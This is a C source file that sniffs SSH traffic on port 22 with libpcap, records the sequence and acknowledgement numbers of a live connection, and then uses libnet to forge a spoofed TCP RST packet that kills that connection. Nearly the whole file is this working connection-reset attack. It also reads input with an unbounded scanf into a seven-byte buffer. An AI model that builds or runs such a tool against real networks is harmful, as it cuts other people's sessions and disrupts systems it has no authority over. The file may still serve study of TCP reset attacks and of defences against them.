#include <stdio.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <libnet.h>
#include <string.h>
#include <signal.h>
#define SSH_PORT 22
#define IDLE_TIMEOUT 30
pcap_t *handle;
char src_ip[INET_ADDRSTRLEN];
	char dst_ip[INET_ADDRSTRLEN]; uint16_t src_port; uint16_t dst_port; uint32_t seq; uint32_t ack;


void alarm_handler(int sig){
    pcap_breakloop(handle);
}


void send_rst_packet(char *src_ip,char *dst_ip, uint16_t src_port, uint16_t dst_port, uint32_t seq, uint32_t ack) {
    libnet_t *l;
    char errbuf[LIBNET_ERRBUF_SIZE];
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!l) {
        fprintf(stderr, "Libnet init failed: %s\n", errbuf);
        return;
    }
   
    libnet_build_tcp(src_port, dst_port, seq, ack, TH_RST, 0, 0, 0, LIBNET_TCP_H, NULL, 0, l, 0);
    libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0, libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_TCP, 0,
                      inet_addr(src_ip), inet_addr(dst_ip), NULL, 0, l, 0);
   
    if (libnet_write(l) == -1) {
        fprintf(stderr, "Error sending RST packet\n");
    } else {
        printf("RST packet sent: %s:%d -> %s:%d\n", src_ip, src_port, dst_ip, dst_port);
    }
   
    libnet_destroy(l);
}
static int i=1;
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ip *ip_header = (struct ip *)(packet + 14); // Assuming Ethernet header is 14 bytes
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + (ip_header->ip_hl * 4));
	

	inet_ntop(AF_INET, &ip_header->ip_src, src_ip, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, &ip_header->ip_dst, dst_ip, INET_ADDRSTRLEN);

    
    if (ntohs(tcp_header->th_dport) == SSH_PORT || ntohs(tcp_header->th_sport) == SSH_PORT) {
        //printf("%d hello%s->%s\n",i,packet,inet_ntoa(ip_header->ip_src));
        printf("%s\n",dst_ip);
        printf("%s\n",src_ip);
        if (tcp_header->th_flags & TH_SYN && !(tcp_header->th_flags & TH_ACK)) {
            printf("%d SSH connection attempt detected: %s:%d -> %s:%d\n",i,
                   src_ip, ntohs(tcp_header->th_sport),
                   dst_ip, ntohs(tcp_header->th_dport));
        }
        if (tcp_header->th_flags & TH_SYN && tcp_header->th_flags & TH_ACK) {
            printf("%d SSH connection established: %s:%d -> %s:%d\n",i,
                   src_ip, ntohs(tcp_header->th_sport),
                   dst_ip, ntohs(tcp_header->th_dport));
        }
        if (tcp_header->th_flags & TH_ACK && !(tcp_header->th_flags & TH_SYN)) {
            
            printf("%d SSH connection stabilized: %s:%d -> %s:%d\n",i,
                    src_ip, ntohs(tcp_header->th_sport),
                   dst_ip, ntohs(tcp_header->th_dport));
		src_port = ntohs(tcp_header->th_sport);
		dst_port = ntohs(tcp_header->th_dport);
		seq = ntohl(tcp_header->th_seq);
		ack = ntohl(tcp_header->th_ack);

            //send_rst_packet(src_ip,dst_ip,   ntohs(tcp_header->th_sport), ntohs(tcp_header->th_dport), ntohl(tcp_header->th_seq), ntohl(tcp_header->th_ack));
        }
        alarm(IDLE_TIMEOUT);
    }
    i++;
}

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    
    struct bpf_program fp;
    char filter_exp[] = "tcp port 22";
    bpf_u_int32 net;

    handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Could not open device: %s\n", errbuf);
        return 1;
    }

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1 || pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Could not apply filter\n");
        return 1;
    }

    printf("Listening for SSH packets...\n");
   
    signal(SIGALRM, alarm_handler);
    // The packet_handler function is called by pcap_loop when a packet is captured.
    // It processes each captured packet to check if it belongs to an SSH connection.
    pcap_loop(handle, 10000, packet_handler, NULL);
    char inp[7];
    printf("give input:");
    scanf("%s",inp);
    if(!strcasecmp(inp,"server"))
        send_rst_packet(src_ip,dst_ip,src_port,dst_port,seq,ack);
    else
        send_rst_packet(dst_ip,src_ip,dst_port,src_port,ack,seq);
    	

    pcap_close(handle);
    return 0;
}
